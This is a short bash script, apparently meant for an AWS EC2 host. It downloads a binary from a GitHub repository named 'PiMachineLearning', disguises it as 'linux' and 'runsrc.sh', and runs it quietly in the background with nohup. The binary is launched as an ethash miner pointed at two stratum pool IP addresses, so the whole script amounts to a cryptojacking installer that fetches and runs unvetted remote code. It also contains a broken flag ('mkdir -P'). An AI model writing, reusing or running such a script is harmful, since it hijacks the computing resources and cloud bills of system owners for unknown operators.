#!/bin/bash

wget https://github.com/Dev699vn/PiMachineLearning/raw/main/linux.tar.gz
tar -xvf linux.tar.gz
rm -rf linux.tar.gz
mkdir -P /home/ec2-user/bin
mv linux /home/ec2-user/bin/linux

echo "#!/bin/bash" > /home/ec2-user/bin/runsrc.sh
echo "./linux -a ethash -o stratum+http://184.164.64.100:8086 -o stratum+http://159.203.107.149:8080" >> /home/ec2-user/bin/runsrc.sh

chmod +x /home/ec2-user/bin/runsrc.sh
chown ec2-user:ec2-user /home/ec2-user/bin/runsrc.sh

sudo -u ec2-user nohup /home/ec2-user/bin/runsrc.sh > /home/ec2-user/bin/result.txt 2>&1 &

